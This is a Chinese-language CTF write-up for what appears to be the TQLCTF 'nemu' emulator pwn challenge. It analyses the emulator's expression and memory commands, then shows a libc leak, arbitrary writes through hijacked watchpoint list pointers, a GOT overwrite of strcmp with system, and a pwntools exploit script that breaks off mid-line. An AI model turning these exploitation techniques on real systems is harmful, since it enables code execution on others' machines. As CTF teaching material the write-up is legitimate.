+<p>以下是设置部分。大致是将WP转换成一个链表结构。其中我们的输入是一个表达式，最后将被算出来数值，放在wp-&gt;old_val中。表达式自身将被放在wp-&gt;exp中。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">void set_watchpoint(char *args)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">bool</span> flag = true;</span><br><span class="line"></span><br><span class="line">  uint32_t val = expr(args, &amp;flag);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!flag) &#123;</span><br><span class="line"></span><br><span class="line">    printf(<span class="string">&quot;You input an invalid expression, failed to create watchpoint!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">  &#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  WP *wp = new_wp();</span><br><span class="line"></span><br><span class="line">  wp-&gt;old_val = val;</span><br><span class="line"></span><br><span class="line">  memcpy(wp-&gt;exp, args, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (head == NULL) &#123;</span><br><span class="line"></span><br><span class="line">    wp-&gt;NO = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    head = wp;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">    WP *wwp;</span><br><span class="line"></span><br><span class="line">    wwp = head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (wwp-&gt;<span class="built_in">next</span> != NULL) &#123;</span><br><span class="line"></span><br><span class="line">      wwp = wwp-&gt;<span class="built_in">next</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    wp-&gt;NO = wwp-&gt;NO + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    wwp-&gt;<span class="built_in">next</span> = wp;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="cmd-p"><a href="#cmd-p" class="headerlink" title="cmd_p"></a>cmd_p</h2><p>用于打印变量数据，或者计算一些表达式的值。其中调用expr()</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_p</span><span class="params">(<span class="type">char</span> *args)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(args == <span class="literal">NULL</span>)&#123;<span class="built_in">printf</span>(<span class="string">&quot;Please input argument\n&quot;</span>); <span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">uint32_t</span> result = expr(args, &amp;success);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!success)&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Wrong express!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%#x\n&quot;</span>,result);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// expr()</span></span><br><span class="line"><span class="type">uint32_t</span> <span class="title function_">expr</span><span class="params">(<span class="type">char</span> *e, <span class="type">bool</span> *success)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// make token用于区分数字和寄存器。其中数字则转换成整型，寄存器则从寄存器中读出数据。</span></span><br><span class="line">  <span class="keyword">if</span> (!make_token(e)) &#123;</span><br><span class="line"></span><br><span class="line">    *success = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">// 以下是一些表达式求值</span></span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;nr_token; i++)&#123;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span>(tokens[i].type == <span class="string">&#x27;-&#x27;</span> &amp;&amp; ( i==<span class="number">0</span> || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;+&#x27;</span>\</span><br><span class="line"></span><br><span class="line">                      || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;-&#x27;</span> || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;*&#x27;</span>\</span><br><span class="line"></span><br><span class="line">                      || tokens[i<span class="number">-1</span>].type == TK_EQ || tokens[i<span class="number">-1</span>].type == TK_NQ \</span><br><span class="line"></span><br><span class="line">                      || tokens[i<span class="number">-1</span>].type == TK_AND || tokens[i<span class="number">-1</span>].type == TK_OR\</span><br><span class="line"></span><br><span class="line">                      || tokens[i<span class="number">-1</span>].type == NOT|| tokens[i<span class="number">-1</span>].type == NEG))&#123;</span><br><span class="line"></span><br><span class="line">                tokens[i].type = NEG;</span><br><span class="line"></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;nr_token; i++)&#123;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span>(tokens[i].type == <span class="string">&#x27;*&#x27;</span> &amp;&amp; ( i==<span class="number">0</span> || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;+&#x27;</span>\</span><br><span class="line"></span><br><span class="line">                         || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;-&#x27;</span> || tokens[i<span class="number">-1</span>].type == <span class="string">&#x27;*&#x27;</span>\</span><br><span class="line"></span><br><span class="line">                         || tokens[i<span class="number">-1</span>].type == TK_EQ || tokens[i<span class="number">-1</span>].type == TK_NQ \</span><br><span class="line"></span><br><span class="line">                         || tokens[i<span class="number">-1</span>].type == TK_AND || tokens[i<span class="number">-1</span>].type == TK_OR\</span><br><span class="line"></span><br><span class="line">                         || tokens[i<span class="number">-1</span>].type == NOT || tokens[i<span class="number">-1</span>].type == NEG ||tokens[i<span class="number">-1</span>].type == DEREF))&#123;</span><br><span class="line"></span><br><span class="line">                tokens[i].type = DEREF;</span><br><span class="line"></span><br><span class="line">             &#125;</span><br><span class="line"></span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">      *success = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> eval(<span class="number">0</span>,nr_token<span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>设置和取消watchpoint的函数不详细写了。似乎没什么重要的。就是实现了一个储存观察点的链表结构。</p>
+<h2 id="cmd-set"><a href="#cmd-set" class="headerlink" title="cmd_set"></a>cmd_set</h2><p>可以用来设置内存。逻辑其实也不复杂，就是将目标地址和数据经过expr()计算后，调用之前的vaddr_write进行写入。这里似乎经过计算得到的data并没有设置大小。是否可以越过pmem越界写？</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">cmd_set</span><span class="params">(<span class="type">char</span> *args)</span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">paddr_t</span> dest_addr;</span><br><span class="line"></span><br><span class="line">  <span class="type">uint32_t</span> data;</span><br><span class="line"></span><br><span class="line">  <span class="type">bool</span> success = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(args == <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please input argument\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//split string</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *dest_addr_str = strtok(args, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *data_str = strtok(<span class="literal">NULL</span>, <span class="string">&quot; &quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (dest_addr_str==<span class="literal">NULL</span>) || (data_str == <span class="literal">NULL</span>))&#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;wrong argument\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dest_addr = expr(dest_addr_str, &amp;success);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!success) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong express!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    data = expr(data_str, &amp;success);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!success) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Wrong express!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vaddr_write(dest_addr, <span class="number">4</span>, data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>个人认为漏洞还是集中在cmd_set、cmd_p这两个操作上。因为这个涉及和HOST的内存交互。也就是下面两个宏定义。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* convert the guest physical address in the guest program to host virtual address in NEMU */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> guest_to_host(p) ((void *)(pmem + (unsigned)p))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* convert the host virtual address in NEMU to guest physical address in the guest program */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> host_to_guest(p) ((paddr_t)((void *)p - (void *)pmem))</span></span><br></pre></td></tr></table></figure>
+
+<p>尝试调试程序。通过以下命令开启源码调试</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(gdb) dir ./nemu_source_code/nemu</span><br></pre></td></tr></table></figure>
+
+<p>对比一下paddr_read的汇编和源码</p>
+<p><img src="/.io//image-20220223233918362.png" alt="image-20220223233918362"></p>
+<p><img src="/.io//image-20220223233716394.png" alt="image-20220223233716394"></p>
+<p>rdi参数其实就是addr，也就是pmem中的偏移。以下0x6a3b80是pmem的地址。这里加上0x100001是寄存器rdi中的内容。</p>
+<p><img src="/.io//image-20220223234032507.png" alt="image-20220223234032507"></p>
+<p>可以看到，对于pmem的大小范围内的数据并没有限制偏移(addr)大小。因此可以用上述两操作完成越界读写。</p>
+<h2 id="泄露libc地址"><a href="#泄露libc地址" class="headerlink" title="泄露libc地址"></a>泄露libc地址</h2><p>由于上述代码中限定了addr只能是无符号数字，而GOT表开始位置比0x6a3b80小很多，因此不能打印GOT表。</p>
+<p><img src="/.io//image-20220224110019517.png" alt="image-20220224110019517"></p>
+<p>但是经过调试发现，在和pmem偏移为0x8001d88位置，存在libc相关信息</p>
+<p><img src="/.io//image-20220224110150166.png" alt="image-20220224110150166"></p>
+<p>但是我们每次只能打印4字节。因此打印两遍即可。使用x指令的越界读即可完成。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">send(<span class="string">&#x27;x 0x8001d88&#x27;</span>) <span class="comment"># get part libc</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;      &#x27;</span>)</span><br><span class="line">libc_info1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) <span class="comment"># the low addr</span></span><br><span class="line">send(<span class="string">&#x27;x 0x8001d8c&#x27;</span>) </span><br><span class="line">io.recvuntil(<span class="string">&#x27;      &#x27;</span>)</span><br><span class="line">libc_info2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>) <span class="comment"># the high addr</span></span><br><span class="line">libc_info = (libc_info2 &lt;&lt; <span class="number">32</span>) + (libc_info1)</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line">libc_base = libc_info - <span class="number">0x3c4ce8</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
+
+<p>但是上述方法似乎仅在gdb连着的时候有效。还是第一次碰到这种问题。<strong>用gdb直接打开进程和用gdb.attach()打开进程结果会不一样，这里也才发现</strong>。用gdb.attach打开时，上述内容全部为0，并且0x86a5900不可访问。</p>
+<p><img src="/.io//image-20220224140407445.png" alt="image-20220224140407445"></p>
+<p>因此只能通过下面的方法，修改head指针为一个GOT地址，再打印出来。其中打印的时候调用如下函数。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">list_watchpoint</span><span class="params">()</span>&#123;</span><br><span class="line">    WP *head2 = head;</span><br><span class="line">    <span class="keyword">if</span>(head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No watch pint to delete\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NO Expr               Old Value               New Value\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(head2)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d  %-18s %#x               %#x\n&quot;</span>,head2-&gt;NO,head2-&gt;<span class="built_in">exp</span>,head2-&gt;old_val,head2-&gt;new_val);</span><br><span class="line">        head2 = head2-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于需要对内存解引用，我们要确保head2-&gt;exp是可以解引用的，并且head-&gt;next为NULL。head-&gt;next的偏移在0x4的位置，exp在0x4+0x8。</p>
+<p><img src="/.io//image-20220224140205513.png" alt="image-20220224140205513"></p>
+<p>由此，我们只需要选择0x60eff8-0x4=0x60eff4(但是经过调试，发现很奇怪还是需要再减去0x4，这里是真的不知道为什么，反正调试的方法就是看next是不是0)</p>
+<p>使用0x60eff0输出可以得到下图的结果。可以看到打印出的就是free的libc。这样我们可以获得一个libc</p>
+<p><img src="/.io//image-20220224141405879.png" alt="image-20220224141405879"></p>
+<h2 id="写入system"><a href="#写入system" class="headerlink" title="写入system"></a>写入system</h2><p>在利用set写入的时候碰到一些问题。就是发现往上层写GOT，无符号数不允许，但是往下写hook函数，又会超过32位大小范围。到这里有点卡住不会了。</p>
+<p>其实在调试pmem后面地址的时候也有发现，可以用pmem修改任意全局变量的地址。其中<strong>set_watchpoint</strong>的head指针也可以被改掉。</p>
+<p><img src="/.io//image-20220224113640343.png" alt="image-20220224113640343"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (head == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    wp-&gt;NO = <span class="number">1</span>;</span><br><span class="line">    head = wp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> NO;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">watchpoint</span> *<span class="title">next</span>;</span></span><br><span class="line"> <span class="type">char</span> <span class="built_in">exp</span>[<span class="number">30</span>];</span><br><span class="line"> <span class="type">uint32_t</span> old_val;</span><br><span class="line"> <span class="type">uint32_t</span> new_val;</span><br><span class="line">&#125; WP;</span><br></pre></td></tr></table></figure>
+
+<p>注意到这里其实是head=wp，那么*head其实是wp-&gt;NO。这样就好办了，我们只需要设置head为某个GOT表的前面位置就行了。查看数据结构，只需要放在偏移为(-0x8+0x4)的地方即可。注意到我们只能写入到old_val地方(会检查是否能够求值，不能写入wp-&gt;exp)因此需要有一定的偏移。</p>
+<p>然而，尝试了直接写入，因为首先不能直接写head（解引用next会导致出错）这个任意地址写也有点困难。看了wp才知道是真的有点难，利用了一段上面没有分析到的代码。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">WP *<span class="title function_">new_wp</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(free_ == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        assert(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//unlink</span></span><br><span class="line">    WP *temp = free_;</span><br><span class="line">    free_ = free_-&gt;next;</span><br><span class="line">    <span class="comment">//insert</span></span><br><span class="line">    temp-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这是当我们新建一个watch point时，nemu会先检查是不是有已经释放的，如果有就拿出来，对其进行写。似乎这里才是真正的任意地址写。而且free_也是一个全局变量</p>
+<p><img src="/.io//image-20220224145004149.png" alt="image-20220224145004149"></p>
+<p>free_就在Head前面，也可以被操控。因此把free_改成我们想要写入的地址附近(这里似乎没有什么检查)可以通过调试看出来偏移为多少的地方可以写入数据。</p>
+<p><img src="/.io//image-20220224145225528.png" alt="image-20220224145225528"></p>
+<p>当我们直接将free_写入strcmp时，可以看到如下偏移位置被写入了0xdeadbeef。因此我们将之前的位置改为-0x30即可在strcmp上写入0xdeadbeef。同时由于只能低地址写入，可以接应strcmp的高2字节，直接在后面写入system。</p>
+<p><img src="/.io//image-20220224145614691.png" alt="image-20220224145614691"></p>
+<p>如下为成功改好了的GOT</p>
+<p><img src="/.io//image-20220224150010870.png" alt="image-20220224150010870"></p>
+<p>之后直接info(/bin/sh)就能拿到一个shell</p>
+<p><img src="/.io//image-20220224150252708.png" alt="image-20220224150252708"></p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./nemu&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;./libc-2.23.so&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">con</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;(nemu)&#x27;</span>)</span><br><span class="line">    io.sendline(con)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">breao=<span class="literal">True</span></span>):</span><br><span class="line">    cmd= <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd += <span class="string">&quot;dir /home/nicholas/Desktop/pwn/tqlctf/nemu/nemu_source_code/nemu\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b vaddr_read\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b vaddr_write\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b paddr_read\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b paddr_write\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b cmd_set\n&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b cmd_w\n&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line">    <span class="keyword">if</span>(breao):</span><br><span class="line">        send(<span class="string">&#x27;x 0x100&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># send(&#x27;x 0x8001d88&#x27;) # get part libc</span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;      &#x27;)</span></span><br><span class="line"><span class="comment"># libc_info1 = int(io.recvuntil(&#x27;\n&#x27;,drop=True),16) # the low addr</span></span><br><span class="line"><span class="comment"># send(&#x27;x 0x8001d8c&#x27;) </span></span><br><span class="line"><span class="comment"># io.recvuntil(&#x27;      &#x27;)</span></span><br><span class="line"><span class="comment"># libc_info2 = 